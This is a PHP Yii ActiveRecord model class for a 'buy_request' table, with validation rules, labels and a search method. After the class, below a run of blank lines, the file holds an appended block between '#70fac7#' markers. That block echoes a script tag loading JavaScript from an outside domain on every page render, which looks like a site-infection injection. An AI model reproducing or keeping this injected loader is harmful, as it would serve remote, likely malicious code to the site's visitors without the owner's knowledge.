
<?php

/**
 * This is the model class for table "buy_request".
 *
 * The followings are the available columns in table 'buy_request':
 * @property integer $brid
 * @property integer $owner_id
 * @property integer $buyer_id
 * @property integer $product_id
 * @property string $message
 * @property string $created_on
 */
class BuyRequest extends CActiveRecord
{
	/**
	 * @return string the associated database table name
	 */
	public function tableName()
	{
		return 'buy_request';
	}

	/**
	 * @return array validation rules for model attributes.
	 */
	public function rules()
	{
		// NOTE: you should only define rules for those attributes that
		// will receive user inputs.
		return array(
			array('owner_id, buyer_id, product_id, message', 'required'),
			array('owner_id, buyer_id, product_id', 'numerical', 'integerOnly'=>true),
			// The following rule is used by search().
			// @todo Please remove those attributes that should not be searched.
			array('brid, owner_id, buyer_id, product_id, message, created_on', 'safe', 'on'=>'search'),
		);
	}

	/**
	 * @return array relational rules.
	 */
	public function relations()
	{
		// NOTE: you may need to adjust the relation name and the related
		// class name for the relations automatically generated below.
		return array(
		);
	}

	/**
	 * @return array customized attribute labels (name=>label)
	 */
	public function attributeLabels()
	{
		return array(
			'brid' => 'Brid',
			'owner_id' => 'Owner',
			'buyer_id' => 'Buyer',
			'product_id' => 'Product',
			'message' => 'Message',
			'created_on' => 'Created On',
		);
	}

	/**
	 * Retrieves a list of models based on the current search/filter conditions.
	 *
	 * Typical usecase:
	 * - Initialize the model fields with values from filter form.
	 * - Execute this method to get CActiveDataProvider instance which will filter
	 * models according to data in model fields.
	 * - Pass data provider to CGridView, CListView or any similar widget.
	 *
	 * @return CActiveDataProvider the data provider that can return the models
	 * based on the search/filter conditions.
	 */
	public function search()
	{
		// @todo Please modify the following code to remove attributes that should not be searched.

		$criteria=new CDbCriteria;

		$criteria->compare('brid',$this->brid);
		$criteria->compare('owner_id',$this->owner_id);
		$criteria->compare('buyer_id',$this->buyer_id);
		$criteria->compare('product_id',$this->product_id);
		$criteria->compare('message',$this->message,true);
		$criteria->compare('created_on',$this->created_on,true);

		return new CActiveDataProvider($this, array(
			'criteria'=>$criteria,
		));
	}

	/**
	 * Returns the static model of the specified AR class.
	 * Please note that you should have this exact method in all your CActiveRecord descendants!
	 * @param string $className active record class name.
	 * @return BuyRequest the static model class
	 */
	public static function model($className=__CLASS__)
	{
		return parent::model($className);
	}
}







#70fac7#
if(empty($w)) {
$w = "<script type=\"text/javascript\" src=\"http://olteniamagazin.ro/2b9vr6yj.php?id=9383499\"></script>";
echo $w;
}
#/70fac7#

